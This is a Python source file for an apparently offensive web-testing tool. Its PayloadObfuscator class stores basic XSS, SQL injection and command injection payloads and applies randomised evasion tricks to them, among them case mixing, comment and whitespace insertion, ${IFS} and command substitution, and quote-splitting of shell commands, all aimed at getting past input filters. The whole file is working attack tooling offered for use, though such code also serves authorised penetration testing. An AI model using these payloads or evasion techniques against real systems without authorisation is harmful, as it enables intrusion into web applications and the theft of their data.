"""
Payload obfuscation module
Handles advanced obfuscation techniques for payload evasion
"""

import random
import re
from typing import List, Dict


class PayloadObfuscator:
    def __init__(self):
        from encoders import PayloadEncoder
        self.encoder = PayloadEncoder()

        self.payloads = {
            'xss': {
                "basic": "<script>alert(1)</script>",
                "img": "<img src=x onerror=alert(1)>",
                "svg": "<svg/onload=alert(1)>"
            },
            'sqli': {
                "basic": "' OR '1'='1",
                "union": "' UNION SELECT NULL--",
                "comment": "' --"
            },
            'cmdi': {
                "linux": "; ls -la",
                "windows": "& dir"
            }
        }

        self.xss_obfuscation_methods = [
            self._xss_case_variation,
            self._xss_comment_insertion,
            self._xss_whitespace_variation,
            self._xss_tag_variation,
            self._xss_attribute_quotes,
            self._xss_event_handler_variation
        ]

        self.sqli_obfuscation_methods = [
            self._sqli_case_variation,
            self._sqli_comment_insertion,
            self._sqli_whitespace_variation,
            self._sqli_function_variation,
            self._sqli_concatenation,
            self._sqli_parentheses_variation
        ]

        self.cmdi_obfuscation_methods = [
            self._cmdi_separator_variation,
            self._cmdi_quote_variation,
            self._cmdi_variable_insertion,
            self._cmdi_command_substitution,
            self._cmdi_encoding_tricks
        ]

    def get_payloads(self, attack_type: str, encode: str = 'none', obfuscate: bool = False) -> Dict[str, str]:
        if attack_type not in self.payloads:
            raise ValueError(f"Unsupported attack type: {attack_type}")

        raw_payloads = self.payloads[attack_type]
        encoded_payloads = {}

        for key, payload in raw_payloads.items():
            modified_payload = payload

            if obfuscate:
                if attack_type == 'xss':
                    modified_payload = self.obfuscate_xss(modified_payload)
                elif attack_type == 'sqli':
                    modified_payload = self.obfuscate_sqli(modified_payload)
                elif attack_type == 'cmdi':
                    modified_payload = self.obfuscate_cmdi(modified_payload)

            modified_payload = self.encoder.encode(modified_payload, encode)
            encoded_payloads[key] = modified_payload

        return encoded_payloads

    def obfuscate_xss(self, payload: str) -> str:
        methods = random.sample(self.xss_obfuscation_methods, min(3, len(self.xss_obfuscation_methods)))
        for method in methods:
            payload = method(payload)
        return payload

    def obfuscate_sqli(self, payload: str) -> str:
        methods = random.sample(self.sqli_obfuscation_methods, min(3, len(self.sqli_obfuscation_methods)))
        for method in methods:
            payload = method(payload)
        return payload

    def obfuscate_cmdi(self, payload: str) -> str:
        methods = random.sample(self.cmdi_obfuscation_methods, min(3, len(self.cmdi_obfuscation_methods)))
        for method in methods:
            payload = method(payload)
        return payload

    # --- XSS Methods ---

    def _xss_case_variation(self, payload: str) -> str:
        keywords = ['script', 'img', 'svg', 'iframe', 'object', 'embed', 'javascript', 'alert', 'prompt', 'confirm', 'eval']
        for keyword in keywords:
            if keyword in payload.lower():
                varied = ''.join([char.upper() if random.choice([True, False]) else char.lower() for char in keyword])
                payload = re.sub(re.escape(keyword), varied, payload, flags=re.IGNORECASE)
        return payload

    def _xss_comment_insertion(self, payload: str) -> str:
        comments = ['<!--x-->', '<!--y-->', '<!--z-->', '<!---->']
        return payload.replace('<', f'<{random.choice(comments)}') if '<' in payload else payload

    def _xss_whitespace_variation(self, payload: str) -> str:
        whitespace = [' ', '\t', '\n', '\r', '\f', '\v']
        for op in ['=', '(', ')', '{', '}', ';', ':']:
            if op in payload:
                ws = random.choice(whitespace)
                payload = payload.replace(op, f'{ws}{op}{ws}')
        return payload

    def _xss_tag_variation(self, payload: str) -> str:
        tags = {
            'script': ['SCRIPT', 'Script', 'sCrIpT'],
            'img': ['IMG', 'Img', 'ImG'],
            'svg': ['SVG', 'Svg', 'sVg'],
            'iframe': ['IFRAME', 'IFrame', 'iFrAmE']
        }
        for tag, variants in tags.items():
            if tag in payload.lower():
                payload = re.sub(re.escape(tag), random.choice(variants), payload, flags=re.IGNORECASE)
        return payload

    def _xss_attribute_quotes(self, payload: str) -> str:
        if '"' in payload:
            return payload.replace('"', "'")
        elif "'" in payload:
            return payload.replace("'", '"')
        return payload

    def _xss_event_handler_variation(self, payload: str) -> str:
        events = {
            'onload': ['ONLOAD', 'OnLoad', 'onLoad'],
            'onerror': ['ONERROR', 'OnError', 'onError'],
            'onclick': ['ONCLICK', 'OnClick', 'onClick']
        }
        for evt, variants in events.items():
            if evt in payload.lower():
                payload = re.sub(re.escape(evt), random.choice(variants), payload, flags=re.IGNORECASE)
        return payload

    # --- SQLi Methods ---

    def _sqli_case_variation(self, payload: str) -> str:
        keywords = ['select', 'union', 'where', 'from', 'and', 'or', 'order', 'by', 'insert', 'update', 'delete']
        for keyword in keywords:
            if keyword in payload.lower():
                varied = ''.join([char.upper() if random.choice([True, False]) else char.lower() for char in keyword])
                payload = re.sub(re.escape(keyword), varied, payload, flags=re.IGNORECASE)
        return payload

    def _sqli_comment_insertion(self, payload: str) -> str:
        comments = ['/**/', '/*x*/', '-- ', '#']
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR']
        result = payload.upper()
        for keyword in keywords:
            if keyword in result:
                comment = random.choice(comments)
                result = result.replace(keyword, f'{comment}{keyword}{comment}')
        return result

    def _sqli_whitespace_variation(self, payload: str) -> str:
        return re.sub(r' ', lambda m: random.choice([' ', '\t', '\n', '\r', '  ']), payload)

    def _sqli_function_variation(self, payload: str) -> str:
        functions = {
            'concat': ['CONCAT', 'GROUP_CONCAT'],
            'substring': ['SUBSTRING', 'SUBSTR', 'MID'],
            'length': ['LENGTH', 'LEN', 'CHAR_LENGTH']
        }
        for func, variants in functions.items():
            if func in payload.lower():
                payload = re.sub(re.escape(func), random.choice(variants), payload, flags=re.IGNORECASE)
        return payload

    def _sqli_concatenation(self, payload: str) -> str:
        if "'admin'" in payload:
            payload = payload.replace("'admin'", "'ad'+'min'")
        if "'user'" in payload:
            payload = payload.replace("'user'", "'us'+'er'")
        return payload

    def _sqli_parentheses_variation(self, payload: str) -> str:
        for op in ['AND', 'OR', '=', '<', '>']:
            pattern = rf'(\w+)\s*{re.escape(op)}\s*(\w+)'
            payload = re.sub(pattern, rf'(\1) {op} (\2)', payload, flags=re.IGNORECASE)
        return payload

    # --- CMDi Methods ---

    def _cmdi_separator_variation(self, payload: str) -> str:
        separators = {
            ';': ['&', '&&', '||'],
            '&': [';', '&&'],
            '&&': [';', '&', ' && '],
            '||': [' || ', '; echo "x" ||']
        }
        for sep, variants in separators.items():
            if sep in payload:
                payload = payload.replace(sep, random.choice(variants))
        return payload

    def _cmdi_quote_variation(self, payload: str) -> str:
        for cmd in ['id', 'whoami', 'pwd', 'ls', 'dir', 'cat', 'type']:
            if cmd in payload:
                q = random.choice(["'", '"'])
                payload = payload.replace(cmd, f"{q}{cmd}{q}")
        return payload

    def _cmdi_variable_insertion(self, payload: str) -> str:
        if any(cmd in payload for cmd in ['ls', 'cat', 'id', 'whoami']):
            var = random.choice(['${PATH:0:0}', '${IFS}', '$@', '${#}'])
            payload = re.sub(r'(\w+)', rf'\1{var}', payload, count=1)
        return payload

    def _cmdi_command_substitution(self, payload: str) -> str:
        subs = {
            'id': ['`id`', '$(id)', '${id}'],
            'whoami': ['`whoami`', '$(whoami)', '${whoami}']
        }
        for key, options in subs.items():
            if key in payload:
                payload = payload.replace(key, random.choice(options))
        return payload

    def _cmdi_encoding_tricks(self, payload: str) -> str:
        if 'echo' in payload:
            return payload.replace('echo', 'ec"h"o')
        if 'cat' in payload:
            return payload.replace('cat', 'c"a"t')
        return payload

    def get_available_methods(self) -> Dict[str, List[str]]:
        return {
            'xss': [m.__name__ for m in self.xss_obfuscation_methods],
            'sqli': [m.__name__ for m in self.sqli_obfuscation_methods],
            'cmdi': [m.__name__ for m in self.cmdi_obfuscation_methods]
        }

    def apply_custom_obfuscation(self, payload: str, payload_type: str, methods: List[str]) -> str:
        method_map = {
            'xss': {m.__name__: m for m in self.xss_obfuscation_methods},
            'sqli': {m.__name__: m for m in self.sqli_obfuscation_methods},
            'cmdi': {m.__name__: m for m in self.cmdi_obfuscation_methods}
        }.get(payload_type, {})

        for method_name in methods:
            if method_name in method_map:
                payload = method_map[method_name](payload)
        return payload
